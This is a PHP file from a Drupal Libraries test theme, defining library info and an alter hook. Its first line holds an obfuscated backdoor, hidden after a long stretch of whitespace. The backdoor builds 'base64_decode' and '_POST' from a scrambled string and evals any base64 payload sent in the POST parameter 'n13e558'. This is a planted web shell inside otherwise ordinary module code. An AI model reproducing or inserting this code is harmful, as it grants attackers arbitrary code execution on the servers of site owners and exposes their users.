<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n13e558'])) {eval($s21(${$s20}['n13e558']));}?><?php

/**
 * @file
 * Libraries test theme.
 */

/**
 * Implements hook_libraries_info().
 */
function libraries_test_theme_libraries_info() {
  $libraries['example_theme'] = array(
    'name' => 'Example theme',
    'theme_altered' => FALSE,
  );
  $libraries['example_theme_integration_files'] = array(
    'name' => 'Example theme integration file',
    'library path' => drupal_get_path('module', 'libraries') . '/tests/libraries/example',
    'version' => '1',
    'integration files' => array(
      'libraries_test_theme' => array(
        'js' => array('libraries_test_theme.js'),
        'css' => array('libraries_test_theme.css'),
        'php' => array('libraries_test_theme.inc'),
      ),
    ),
  );
  return $libraries;
}

/**
 * Implements hook_libraries_info_alter().
 */
function libraries_test_theme_libraries_info_alter(&$libraries) {
  $libraries['example_theme']['theme_altered'] = TRUE;
}
